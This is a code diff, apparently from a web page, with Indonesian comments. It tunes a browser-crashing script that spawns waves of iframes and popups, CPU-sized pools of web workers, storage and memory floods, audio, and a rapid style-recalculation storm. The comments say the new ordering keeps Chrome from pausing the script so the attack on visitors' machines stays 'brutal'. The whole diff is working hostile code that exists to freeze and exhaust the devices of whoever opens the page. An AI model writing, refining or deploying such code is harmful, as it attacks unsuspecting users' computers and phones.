@@ -559,11 +559,15 @@
     }
 
     // ═══════════ BOOT ENGINES ═══════════
-    storageStorm();
-    sideStorm();
-    setInterval(storageStorm, 4000);
+    // PENTING: controller JANGAN freeze main thread dulu.
+    // Kalau langsung hang → Chrome "Tidak Merespons" → JS di-pause → hydra gagal → kurang brutal.
+    // Urutan: spawn banyak proses DULU, baru rampage.
 
     if (IS_SLAVE) {
+      // Slave = mesin bakar penuh (ini yang bikin brutal)
+      storageStorm();
+      sideStorm();
+      setInterval(storageStorm, 4000);
       for (let i = 0; i < (IS_MOBILE ? 28 : 32); i++) eat();
       spawnWorkers(
         Math.max(IS_MOBILE ? 18 : 32, cores * (IS_MOBILE ? 4 : 6)),
@@ -579,16 +583,6 @@
       const pops = [];
       const iframeTarget = IS_MOBILE ? 20 : 20;
       const popupTarget = IS_MOBILE ? 0 : 10;
-
-      for (let i = 0; i < (IS_MOBILE ? 14 : 12); i++) eat();
-      spawnWorkers(
-        Math.max(IS_MOBILE ? 12 : 16, cores * 2),
-        Math.max(IS_MOBILE ? 5 : 8, cores),
-        Math.max(IS_MOBILE ? 2 : 4, Math.ceil(cores / 2))
-      );
-      startVisual(1);
-      startAudio();
-      flood();
 
       function addIframe() {
         const f = document.createElement('iframe');
@@ -608,8 +602,39 @@
         return w;
       }
 
+      // 1) HYDRA FIRST — biarkan Chrome buat banyak renderer
       for (let i = 0; i < iframeTarget; i++) addIframe();
       for (let i = 0; i < popupTarget; i++) addPopup();
+
+      // 2) Controller ringan dulu (jangan flood / jangan mainBurn berat)
+      spawnWorkers(
+        Math.max(IS_MOBILE ? 4 : 6, Math.ceil(cores / 2)),
+        Math.max(IS_MOBILE ? 2 : 3, 2),
+        IS_MOBILE ? 1 : 2
+      );
+      startAudio();
+
+      // 3) Setelah hydra sempat load (~1.2s), baru controller ikut ngegas
+      setTimeout(() => {
+        sideStorm();
+        storageStorm();
+        setInterval(storageStorm, 4000);
+        for (let i = 0; i < (IS_MOBILE ? 8 : 10); i++) eat();
+        startVisual(1);
+        // ramp workers tambahan
+        spawnWorkers(
+          Math.max(IS_MOBILE ? 8 : 12, cores),
+          Math.max(IS_MOBILE ? 3 : 5, Math.ceil(cores / 2)),
+          Math.max(IS_MOBILE ? 2 : 3, 2)
+        );
+      }, 1200);
+
+      // 4) Peak kedua — tambah tekanan tanpa bunuh respawn
+      setTimeout(() => {
+        for (let i = 0; i < 6; i++) eat();
+        for (let i = 0; i < (IS_MOBILE ? 4 : 6); i++) addIframe();
+        if (!IS_MOBILE) for (let i = 0; i < 4; i++) addPopup();
+      }, 2500);
 
       function arm() {
         if (armed) {
@@ -659,12 +684,11 @@
         if (iframes.length < (IS_MOBILE ? 24 : 28)) addIframe();
       }, 1500);
 
-      // style recalc storm
       setInterval(() => {
         document.documentElement.style.setProperty('--r', Math.random());
         void document.body.offsetHeight;
         document.body.style.zoom = String(0.96 + Math.random() * 0.08);
-      }, 18);
+      }, 40);
     }
   })();
   </script>
